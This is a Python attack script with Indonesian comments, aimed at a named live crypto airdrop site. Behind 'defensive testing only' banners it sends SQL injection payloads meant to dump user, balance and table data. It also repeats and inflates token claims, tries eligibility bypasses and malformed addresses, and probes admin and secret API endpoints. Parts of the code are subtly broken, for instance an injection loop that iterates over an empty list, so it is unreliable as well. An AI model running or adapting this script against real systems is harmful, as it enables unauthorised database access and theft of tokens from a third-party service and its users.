#!/usr/bin/env python3
"""
Address Control Tester untuk 0G Foundation Airdrop
Mencoba mendapatkan akses ke address control dan token claiming database
HANYA UNTUK TUJUAN PENGETESAN KEAMANAN DEFENSIF
"""

import asyncio
import json
import re
import time
import base64
import hashlib
import random
import string
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp


class AddressControlTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.scan_results = {}
        self.start_time = time.time()

    async def run_address_control_tests(self):
        """Jalankan pengujian akses address control secara lengkap"""
        print("🔍 Memulai Address Control Testing")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("⚠️  FOR SECURITY TESTING PURPOSES ONLY")
        print("=" * 60)

        results = {}

        # Phase 1: Address Enumeration
        print("\n🎯 Phase 1: Address Enumeration")
        results["address_enumeration"] = await self.address_enumeration()

        # Phase 2: Address Manipulation Testing
        print("\n🔓 Phase 2: Address Manipulation Testing")
        results["address_manipulation"] = await self.address_manipulation_testing()

        # Phase 3: Token Claiming Testing
        print("\n🪙 Phase 3: Token Claiming Testing")
        results["token_claiming"] = await self.token_claiming_testing()

        # Phase 4: Eligibility Bypass Testing
        print("\n🎭 Phase 4: Eligibility Bypass Testing")
        results["eligibility_bypass"] = await self.eligibility_bypass_testing()

        # Phase 5: Address Control Database Access
        print("\n💾 Phase 5: Address Control Database Access")
        results["database_access"] = await self.database_access_testing()

        # Phase 6: API Endpoint Discovery
        print("\n📡 Phase 6: API Endpoint Discovery")
        results["api_discovery"] = await self.api_endpoint_discovery()

        # Generate final report
        results["summary"] = self.generate_summary_report(results)
        results["scan_duration"] = time.time() - self.start_time

        return results

    async def address_enumeration(self):
        """Enumerasi address yang valid"""
        try:
            async with aiohttp.ClientSession() as session:
                self.session = session

                # Test addresses
                test_addresses = [
                    # Valid Ethereum addresses
                    "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
                    "0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed",

                    # Address variations
                    "0x0000000000000000000000000000000000000000",  # Zero address
                    "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",  # Max address
                    "0x1234567890123456789012345678901234567890",  # Random valid
                    "0x1111111111111111111111111111111111111111",  # Pattern address

                    # Invalid addresses (test validation)
                    "invalid_address",
                    "0x4bc6D600889003f4516167bb46dD04aF33E0312",  # Too short
                    "0x4bc6D600889003f4516167bb46dD04aF33E0312bc",  # Too long
                    "0xGHIJKLmnopqrstuvwxyz1234567890abcdef",  # Invalid characters
                ]

                address_results = []
                valid_addresses = []
                invalid_addresses = []

                for address in test_addresses:
                    try:
                        # Test address validation through API endpoints
                        endpoints_to_test = [
                            f"/api/validate?address={address}",
                            f"/api/check?address={address}",
                            f"/api/verify?address={address}",
                        ]

                        address_info = {
                            "address": address,
                            "is_valid": self.validate_ethereum_address(address),
                            "endpoint_results": [],
                            "vulnerable": False
                        }

                        for endpoint in endpoints_to_test:
                            try:
                                response = await session.get(urljoin(self.target_url, endpoint))

                                endpoint_result = {
                                    "endpoint": endpoint,
                                    "status_code": response.status,
                                    "content": response.text[:200] if len(response.text) > 200 else response.text,
                                    "valid_response": "valid" in response.text.lower() or "error" not in response.text.lower(),
                                    "potential_vulnerability": False
                                }

                                # Check for address enumeration vulnerability
                                if response.status == 200 and address in response.text:
                                    endpoint_result["potential_vulnerability"] = True
                                    address_info["vulnerable"] = True

                                address_info["endpoint_results"].append(endpoint_result)

                            except Exception as e:
                                address_info["endpoint_results"].append({
                                    "endpoint": endpoint,
                                    "error": str(e)
                                })

                        address_results.append(address_info)

                        # Categorize addresses
                        if self.validate_ethereum_address(address):
                            valid_addresses.append(address)
                        else:
                            invalid_addresses.append(address)

                    except Exception as e:
                        address_results.append({
                            "address": address,
                            "error": str(e)
                        })

                # Calculate security score
                vulnerable_count = sum(1 for addr in address_results if addr.get("vulnerable", False))
                security_score = max(0, 100 - vulnerable_count * 20)

                return {
                    "addresses_tested": len(test_addresses),
                    "valid_addresses": len(valid_addresses),
                    "invalid_addresses": len(invalid_addresses),
                    "address_results": address_results,
                    "vulnerable_addresses": vulnerable_count,
                    "security_score": security_score,
                    "score": security_score
                }

        except Exception as e:
            return {"error": str(e), "score": 0}

    def validate_ethereum_address(self, address):
        """Validate Ethereum address format"""
        if not address or len(address) != 42:
            return False
        if not address.startswith("0x"):
            return False
        if not all(c in "0123456789abcdefABCDEF" for c in address[2:]):
            return False
        return True

    async def address_manipulation_testing(self):
        """Testing manipulasi address"""
        try:
            # Various attack vectors for address manipulation
            manipulation_vectors = [
                # Address padding variations
                "0x4bc6D600889003f4516167bb46dD04aF33E0312b\x00",  # Null byte
                "0x4bc6D600889003f4516167bb46dD04aF33E0312b\x20",  # Space padding
                "0x4bc6D600889003f4516167bb46dD04aF33E0312b\n",    # Newline padding

                # Case manipulation
                "0X4BC6D600889003F4516167BB46DD04AF33E0312B",     # Uppercase 0X

                # Hex variations
                "000000000000000000004bc6D600889003f4516167bb46dD04aF33E0312b",  # No 0x prefix
                "0x000000000000000000004bc6D600889003f4516167bb46dD04aF33E0312b",  # Extra padding

                # Address arithmetic
                "0x4bc6D600889003f4516167bb46dD04aF33E0312b1",   # Add one
                "0x4bc6D600889003f4516167bb46dD04aF33E0312a",   # Subtract one

                # Format manipulation
                "0x4bc6D600889003f4516167bb46dD04aF33E0312b ",   # Trailing space
                " 0x4bc6D600889003f4516167bb46dD04aF33E0312b",   # Leading space
                "\t0x4bc6D600889003f4516167bb46dD04aF33E0312b",   # Leading tab

                # URL encoding
                "0x4bc6D600889003f4516167bb46dD04aF33E0312b%00",  # URL encoded null
                "0x4bc6D600889003f4516167bb46dD04aF33E0312b%20",  # URL encoded space
            ]

            manipulation_results = []
            successful_manipulations = []

            # Test each manipulation vector
            for i, manipulated_address in enumerate(manipulation_vectors):
                try:
                    # Test in multiple endpoints
                    endpoints_to_test = [
                        f"/api/eligibility?address={manipulated_address}",
                        f"/api/balance?address={manipulated_address}",
                        f"/api/claim?address={manipulated_address}",
                        f"/api/transfer?address={manipulated_address}"
                    ]

                    manipulation_info = {
                        "vector_id": i + 1,
                        "original_address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                        "manipulated_address": manipulated_address,
                        "endpoints_tested": [],
                        "successful": False
                    }

                    for endpoint in endpoints_to_test:
                        try:
                            response = await self.session.get(urljoin(self.target_url, endpoint))

                            endpoint_result = {
                                "endpoint": endpoint,
                                "status_code": response.status,
                                "content_length": len(response.text),
                                "contains_address": manipulated_address in response.text,
                                "contains_original": "0x4bc6D600889003f4516167bb46dD04aF33E0312b" in response.text,
                                "potential_vulnerability": False
                            }

                            # Check for successful manipulation
                            if response.status == 200:
                                if manipulated_address in response.text and "0x4bc6D600889003f4516167bb46dD04aF33E0312b" not in response.text:
                                    endpoint_result["potential_vulnerability"] = True
                                    manipulation_info["successful"] = True

                            manipulation_info["endpoints_tested"].append(endpoint_result)

                        except Exception as e:
                            manipulation_info["endpoints_tested"].append({
                                "endpoint": endpoint,
                                "error": str(e)
                            })

                    manipulation_results.append(manipulation_info)

                    if manipulation_info["successful"]:
                        successful_manipulations.append({
                            "vector_id": i + 1,
                            "address": manipulated_address,
                            "endpoints": [ep["endpoint"] for ep in manipulation_info["endpoints_tested"] if isinstance(ep, dict) and ep.get("potential_vulnerability")]
                        })

                except Exception as e:
                    manipulation_results.append({
                        "vector_id": i + 1,
                        "error": str(e)
                    })

            # Calculate manipulation security score
            vulnerability_count = len(successful_manipulations)
            security_score = max(0, 100 - vulnerability_count * 30)

            return {
                "vectors_tested": len(manipulation_vectors),
                "successful_manipulations": vulnerability_count,
                "manipulation_results": manipulation_results,
                "successful_details": successful_manipulations,
                "address_manipulation_secure": vulnerability_count == 0,
                "score": security_score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def token_claiming_testing(self):
        """Testing token claiming mechanism"""
        try:
            # Test token claiming with various addresses and amounts
            claiming_tests = [
                {
                    "name": "Normal Claim",
                    "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "amount": "20000",
                    "expected_success": True
                },
                {
                    "name": "Zero Amount",
                    "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "amount": "0",
                    "expected_success": False
                },
                {
                    "name": "Negative Amount",
                    "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "amount": "-1000",
                    "expected_success": False
                },
                {
                    "name": "Excessive Amount",
                    "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "amount": "999999999999999999999",
                    "expected_success": False
                },
                {
                    "name": "Multiple Claims",
                    "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "amount": "20000",
                    "expected_success": True,
                    "repeat": 5
                },
                {
                    "name": "Different Address",
                    "address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
                    "amount": "20000",
                    "expected_success": False  # Unless this address is also eligible
                }
            ]

            claiming_results = []
            successful_claims = []
            vulnerabilities = []

            for test in claiming_tests:
                test_info = {
                    "test_name": test["name"],
                    "address": test["address"],
                    "amount": test["amount"],
                    "repeat": test.get("repeat", 1),
                    "results": [],
                    "vulnerable": False
                }

                repeat_count = test.get("repeat", 1)
                for i in range(repeat_count):
                    try:
                        # Try different claiming methods
                        if "POST" in str(test.get("method", "POST")):
                            data = {"address": test["address"], "amount": test["amount"]}
                            response = await self.session.post(urljoin(self.target_url, "/api/claim"), json=data)
                        else:
                            response = await self.session.get(urljoin(self.target_url, f"/api/claim?address={test['address']}&amount={test['amount']}"))

                        result = {
                            "attempt": i + 1,
                            "status_code": response.status,
                            "content": response.text[:300] if len(response.text) > 300 else response.text,
                            "success": response.status == 200,
                            "transaction_hash": self.extract_transaction_hash(response.text)
                        }

                        # Check for vulnerabilities
                        if response.status == 200:
                            if "success" in response.text.lower():
                                if test["expected_success"]:
                                    # Expected success
                                    pass
                                else:
                                    result["vulnerability"] = f"Unexpected success for {test['name']}"
                                    test_info["vulnerable"] = True
                                    vulnerabilities.append({
                                        "test": test["name"],
                                        "address": test["address"],
                                        "amount": test["amount"],
                                        "issue": "Unexpected success"
                                    })
                            else:
                                result["vulnerability"] = f"Unexpected response for {test['name']}"
                                test_info["vulnerable"] = True
                        elif response.status == 500:
                            result["vulnerability"] = "Server error might indicate vulnerability"
                            test_info["vulnerable"] = True
                        elif response.status == 403:
                            result["vulnerability"] = "Access denied"
                        else:
                            result["vulnerability"] = f"Unexpected status {response.status}"

                        test_info["results"].append(result)

                        if result["success"] and not test_info["vulnerable"]:
                            successful_claims.append({
                                "test": test["name"],
                                "address": test["address"],
                                "amount": test["amount"],
                                "attempt": i + 1
                            })

                    except Exception as e:
                        test_info["results"].append({
                            "attempt": i + 1,
                            "error": str(e)
                        })

                claiming_results.append(test_info)

            # Calculate claiming security score
            vulnerability_count = len(vulnerabilities)
            security_score = max(0, 100 - vulnerability_count * 25)

            return {
                "claiming_tests": len(claiming_tests),
                "successful_claims": len(successful_claims),
                "vulnerabilities_found": vulnerability_count,
                "claiming_results": claiming_results,
                "vulnerability_details": vulnerabilities,
                "token_claiming_secure": vulnerability_count == 0,
                "score": security_score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    def extract_transaction_hash(self, content):
        """Extract transaction hash from response"""
        # Look for common transaction hash patterns
        patterns = [
            r"0x[a-fA-F0-9]{64}",
            r"tx_hash.*[:=][\s]*\"?0x[a-fA-F0-9]{64}",
            r"transaction.*[:=][\s]*\"?0x[a-fA-F0-9]{64}"
        ]

        for pattern in patterns:
            match = re.search(pattern, content)
            if match:
                return match.group(0)
        return None

    async def eligibility_bypass_testing(self):
        """Testing bypass eligibility requirements"""
        try:
            # Test eligibility bypass vectors
            bypass_tests = [
                {
                    "name": "Missing Social Proof",
                    "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "twitter_followed": False,
                    "discord_joined": False,
                    "wallet_connected": True,
                    "expected_eligible": False
                },
                {
                    "name": "Partial Social Proof",
                    "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "twitter_followed": True,
                    "discord_joined": False,
                    "wallet_connected": True,
                    "expected_eligible": False
                },
                {
                    "name": "Complete Social Proof",
                    "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "twitter_followed": True,
                    "discord_joined": True,
                    "wallet_connected": True,
                    "expected_eligible": True
                },
                {
                    "name": "No Wallet Connection",
                    "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b",
                    "twitter_followed": True,
                    "discord_joined": True,
                    "wallet_connected": False,
                    "expected_eligible": False
                }
            ]

            bypass_results = []
            successful_bypasses = []
            vulnerabilities = []

            for test in bypass_tests:
                test_info = {
                    "test_name": test["name"],
                    "address": test["address"],
                    "conditions": {
                        "twitter_followed": test["twitter_followed"],
                        "discord_joined": test["discord_joined"],
                        "wallet_connected": test["wallet_connected"]
                    },
                    "expected_eligible": test["expected_eligible"],
                    "actual_eligible": False,
                    "vulnerable": False
                }

                try:
                    # Test eligibility check
                    response = await self.session.get(urljoin(self.target_url, f"/api/eligibility?address={test['address']}"))

                    if response.status == 200:
                        content = response.text.lower()

                        # Check eligibility response
                        if "eligible" in content or "true" in content:
                            test_info["actual_eligible"] = True

                        # Check for bypass vulnerability
                        if test_info["actual_eligible"] != test["expected_eligible"]:
                            test_info["vulnerable"] = True
                            vulnerabilities.append({
                                "test": test["name"],
                                "expected": test["expected_eligible"],
                                "actual": test_info["actual_eligible"],
                                "conditions": test["conditions"]
                            })

                        # Check for incorrect conditions
                        if test_info["actual_eligible"]:
                            if not test["twitter_followed"] and "twitter" in content:
                                vulnerabilities.append({
                                    "test": f"{test['name']} - Twitter Check",
                                    "issue": "Twitter not followed but eligibility shows twitter"
                                })
                            if not test["discord_joined"] and "discord" in content:
                                vulnerabilities.append({
                                    "test": f"{test['name']} - Discord Check",
                                    "issue": "Discord not joined but eligibility shows discord"
                                })
                            if not test["wallet_connected"] and "wallet" in content:
                                vulnerabilities.append({
                                    "test": f"{test['name']} - Wallet Check",
                                    "issue": "Wallet not connected but eligibility shows wallet"
                                })

                except Exception as e:
                    test_info["error"] = str(e)

                bypass_results.append(test_info)

                if test_info["actual_eligible"] and not test_info["vulnerable"]:
                    successful_bypasses.append({
                        "test": test["name"],
                        "conditions": test["conditions"]
                    })

            # Calculate eligibility security score
            vulnerability_count = len(vulnerabilities)
            security_score = max(0, 100 - vulnerability_count * 30)

            return {
                "bypass_tests": len(bypass_tests),
                "successful_bypasses": len(successful_bypasses),
                "vulnerabilities_found": vulnerability_count,
                "bypass_results": bypass_results,
                "vulnerability_details": vulnerabilities,
                "eligibility_secure": vulnerability_count == 0,
                "score": security_score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def database_access_testing(self):
        """Testing akses ke database address control"""
        try:
            # Test database connection patterns
            response = await self.session.get(self.target_url)
            content = response.text

            # Database connection patterns
            db_patterns = {
                "mysql": [
                    r"mysql://[^:]+:[^@]+@[^/]+/\w+",
                    r"mysql_host.*=.*['\"]([^'\"]+)['\"]",
                    r"mysql_user.*=.*['\"]([^'\"]+)['\"]",
                    r"mysql_pass.*=.*['\"]([^'\"]+)['\"]"
                ],
                "postgresql": [
                    r"postgresql://[^:]+:[^@]+@[^/]+/\w+",
                    r"postgres.*host.*=.*['\"]([^'\"]+)['\"]",
                    r"postgres.*user.*=.*['\"]([^'\"]+)['\"]",
                    r"postgres.*password.*=.*['\"]([^'\"]+)['\"]"
                ],
                "sqlite": [
                    r"sqlite:.*\.db",
                    r"sqlite.*database.*=.*['\"]([^'\"]+\.db)['\"]"
                ]
            }

            found_db_configs = {}
            for db_type, patterns in db_patterns.items():
                configs = []
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    configs.extend(matches)
                if configs:
                    found_db_configs[db_type] = configs

            # Test database queries through injection
            injection_results = []
            injection_payloads = [
                "' UNION SELECT address, amount FROM eligible_users--",
                "' UNION SELECT * FROM address_balances--",
                "' UNION SELECT username, tokens FROM users--",
                "' OR 1=1; SELECT * FROM address_control--"
            ]

            for payload in injection_payloads:
                try:
                    # Test through login form
                    data = {"username": payload, "password": "test"}
                    response = await self.session.post(urljoin(self.target_url, "/login"), data=data)

                    if response.status == 200:
                        if any(keyword in response.text.lower() for keyword in [
                            "address", "balance", "tokens", "users", "eligible_users"
                        ]):
                            injection_results.append({
                                "payload": payload,
                                "status": "Potential database information leaked",
                                "content": response.text[:200]
                            })

                except Exception as e:
                    # Error might indicate successful injection
                    if "timeout" in str(e).lower() or "connection" in str(e).lower():
                        injection_results.append({
                            "payload": payload,
                            "status": "Potential successful injection",
                            "error": str(e)
                        })

            # Test database table enumeration
            table_enum_results = []
            table_payloads = [
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT table_name FROM pg_tables--",
                "' UNION SELECT name FROM sqlite_master--"
            ]

            for payload in table_payloads:
                try:
                    response = await self.session.post(urljoin(self.target_url, "/api/search"), json={"query": payload})

                    if response.status == 200:
                        content = response.text.lower()
                        if any(keyword in content for keyword in [
                            "table", "users", "address", "balance", "token", "eligible"
                        ]):
                            table_enum_results.append({
                                "payload": payload,
                                "status": "Tables potentially enumerated",
                                "content": response.text[:200]
                            })

                except Exception as e:
                    pass

            # Calculate database access security score
            vulnerability_count = len(injection_results) + len(table_enum_results)
            security_score = max(0, 100 - vulnerability_count * 35)

            return {
                "database_configurations": len(found_db_configs),
                "found_configs": found_db_configs,
                "injection_tests": len(injection_payloads),
                "injection_results": len(injection_results),
                "table_enum_tests": len(table_payloads),
                "table_enum_results": len(table_enum_results),
                "database_vulnerabilities": vulnerability_count,
                "injection_details": injection_results,
                "table_enum_details": table_enum_results,
                "database_access_secure": vulnerability_count == 0,
                "score": security_score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def api_endpoint_discovery(self):
        """Discovery API endpoint untuk akses address control"""
        try:
            # Common API endpoints for address control
            api_endpoints = [
                "/api",
                "/api/v1",
                "/api/v2",
                "/api/admin",
                "/api/internal",
                "/api/secret",
                "/api/config",
                "/api/database",
                "/api/address",
                "/api/addresses",
                "/api/users",
                "/api/eligibility",
                "/api/claim",
                "/api/balance",
                "/api/transfer",
                "/api/validate",
                "/api/check",
                "/api/verify",
                "/api/data",
                "/api/query",
                "/api/search",
                "/api/get",
                "/api/set",
                "/api/update",
                "/api/delete",
                "/api/list",
                "/api/enumerate"
            ]

            discovered_endpoints = []
            vulnerable_endpoints = []

            for endpoint in api_endpoints:
                try:
                    response = await self.session.get(urljoin(self.target_url, endpoint))

                    if response.status in [200, 401, 403, 404, 500]:
                        endpoint_info = {
                            "endpoint": endpoint,
                            "status_code": response.status,
                            "content_length": len(response.text),
                            "potential_vulnerability": False
                        }

                        # Check for vulnerable endpoints
                        if response.status == 200:
                            if any(keyword in response.text.lower() for keyword in [
                                "address", "token", "balance", "claim", "eligible"
                            ]):
                                endpoint_info["potential_vulnerability"] = True
                                vulnerable_endpoints.append(endpoint)
                        elif response.status == 500:
                            endpoint_info["potential_vulnerability"] = True
                            vulnerable_endpoints.append(endpoint)

                        discovered_endpoints.append(endpoint_info)

                except Exception as e:
                    # Connection error might indicate protected endpoint
                    discovered_endpoints.append({
                        "endpoint": endpoint,
                        "error": str(e),
                        "potential_vulnerability": False
                    })

            # Test parameter injection in endpoints
            param_injection_results = []
            test_parameters = [
                {"param": "address", "value": "0x4bc6D600889003f4516167bb46dD04aF33E0312b'"},
                {"param": "id", "value": "1 OR 1=1"},
                {"param": "user", "value": "admin'--"},
                {"param": "token", "value": "test' UNION SELECT * FROM users--"}
            ]

            for param_test in param_injection_results:
                try:
                    endpoint_with_param = f"/api/{param_test['param']}?{param_test['param']}={param_test['value']}"
                    response = await self.session.get(urljoin(self.target_url, endpoint_with_param))

                    if response.status == 200:
                        if any(keyword in response.text.lower() for keyword in [
                            "sql", "error", "table", "database", "users"
                        ]):
                            param_injection_results.append({
                                "parameter": param_test['param'],
                                "value": param_test['value'],
                                "status": "Potential SQL injection",
                                "content": response.text[:200]
                            })

                except Exception as e:
                    pass

            # Calculate API security score
            vulnerability_count = len(vulnerable_endpoints) + len(param_injection_results)
            security_score = max(0, 100 - vulnerability_count * 20)

            return {
                "endpoints_tested": len(api_endpoints),
                "discovered_endpoints": len(discovered_endpoints),
                "vulnerable_endpoints": len(vulnerable_endpoints),
                "param_injection_tests": len(param_injection_results),
                "param_injection_results": len(param_injection_results),
                "api_security_score": security_score,
                "discovered_details": discovered_endpoints,
                "vulnerable_details": vulnerable_endpoints,
                "api_secure": vulnerability_count == 0,
                "score": security_score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    def generate_summary_report(self, results):
        """Generate summary report"""
        summary = {
            "test_completed": True,
            "overall_security_score": 0,
            "risk_level": "Unknown",
            "critical_vulnerabilities": [],
            "address_control_status": "Secure",
            "recommendations": [],
            "next_steps": []
        }

        # Calculate overall security score
        all_scores = []
        for category_name, category_data in results.items():
            if isinstance(category_data, dict) and 'score' in category_data:
                all_scores.append(category_data['score'])

        if all_scores:
            summary["overall_security_score"] = sum(all_scores) / len(all_scores)

        # Determine risk level
        if summary["overall_security_score"] >= 80:
            summary["risk_level"] = "Low"
        elif summary["overall_security_score"] >= 60:
            summary["risk_level"] = "Medium"
        elif summary["overall_security_score"] >= 40:
            summary["risk_level"] = "High"
        else:
            summary["risk_level"] = "Critical"

        # Identify critical vulnerabilities
        critical_vulnerabilities = []

        # Address manipulation vulnerabilities
        manipulation = results.get("address_manipulation", {})
        if manipulation.get("successful_manipulations", 0) > 0:
            critical_vulnerabilities.append(f"Address manipulation possible: {manipulation['successful_manipulations']} successful attacks")

        # Token claiming vulnerabilities
        claiming = results.get("token_claiming", {})
        if claiming.get("vulnerabilities_found", 0) > 0:
            critical_vulnerabilities.append(f"Token claiming vulnerabilities: {claiming['vulnerabilities_found']} issues found")

        # Eligibility bypass vulnerabilities
        bypass = results.get("eligibility_bypass", {})
        if bypass.get("vulnerabilities_found", 0) > 0:
            critical_vulnerabilities.append(f"Eligibility bypass: {bypass['vulnerabilities_found']} issues found")

        # Database access vulnerabilities
        db_access = results.get("database_access", {})
        if db_access.get("database_vulnerabilities", 0) > 0:
            critical_vulnerabilities.append(f"Database access: {db_access['database_vulnerabilities']} potential vulnerabilities")

        # API vulnerabilities
        api_discovery = results.get("api_discovery", {})
        if api_discovery.get("vulnerable_endpoints", 0) > 0:
            critical_vulnerabilities.append(f"API vulnerabilities: {api_discovery['vulnerable_endpoints']} vulnerable endpoints found")

        summary["critical_vulnerabilities"] = critical_vulnerabilities

        # Determine address control status
        if critical_vulnerabilities:
            summary["address_control_status"] = "Compromised"
            summary["recommendations"].append("CRITICAL: Address control system is vulnerable")
            summary["recommendations"].append("Immediate security remediation required")
        elif summary["overall_security_score"] >= 60:
            summary["address_control_status"] = "Secure"
            summary["recommendations"].append("Address control system appears secure")
            summary["recommendations"].append("Continue monitoring and regular testing")
        else:
            summary["address_control_status"] = "Needs Improvement"
            summary["recommendations"].append("Address control system needs security improvements")
            summary["recommendations"].append("Implement additional validation and monitoring")

        # Add general recommendations
        if summary["overall_security_score"] < 80:
            summary["recommendations"].append("Implement comprehensive input validation")
            summary["recommendations"].append("Add rate limiting and monitoring")
            summary["recommendations"].append("Regular security audits and penetration testing")

        summary["next_steps"] = summary["recommendations"]

        return summary

    async def save_report(self, results):
        """Save report to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"address_control_test_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)

        print(f"📊 Report saved to: {filename}")
        return filename


async def main():
    """Main execution function"""
    target_url = "https://airdrop.0gfoundation.ai"

    print("🔍 Address Control Tester")
    print("=" * 60)
    print(f"🎯 Target: {target_url}")
    print("=" * 60)
    print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
    print("⚠️  FOR SECURITY TESTING PURPOSES ONLY")
    print("=" * 60)

    tester = AddressControlTester(target_url)
    results = await tester.run_address_control_tests()

    if results:
        # Save report
        await tester.save_report(results)

        print(f"\n✅ Address Control Testing completed!")
        print(f"📊 Overall Security Score: {results['summary']['overall_security_score']:.1f}/100")
        print(f"🎯 Risk Level: {results['summary']['risk_level']}")
        print(f"🏷️ Address Control Status: {results['summary']['address_control_status']}")
        print(f"⏱️ Scan Duration: {results['scan_duration']:.2f} seconds")

        # Show critical vulnerabilities
        if results['summary']['critical_vulnerabilities']:
            print(f"\n🚨 CRITICAL VULNERABILITIES:")
            for vuln in results['summary']['critical_vulnerabilities']:
                print(f"   • {vuln}")

        # Show recommendations
        if results['summary']['recommendations']:
            print(f"\n💡 RECOMMENDATIONS:")
            for rec in results['summary']['recommendations']:
                print(f"   • {rec}")

        return results
    else:
        print("❌ Address control testing failed!")
        return None


if __name__ == "__main__":
    asyncio.run(main())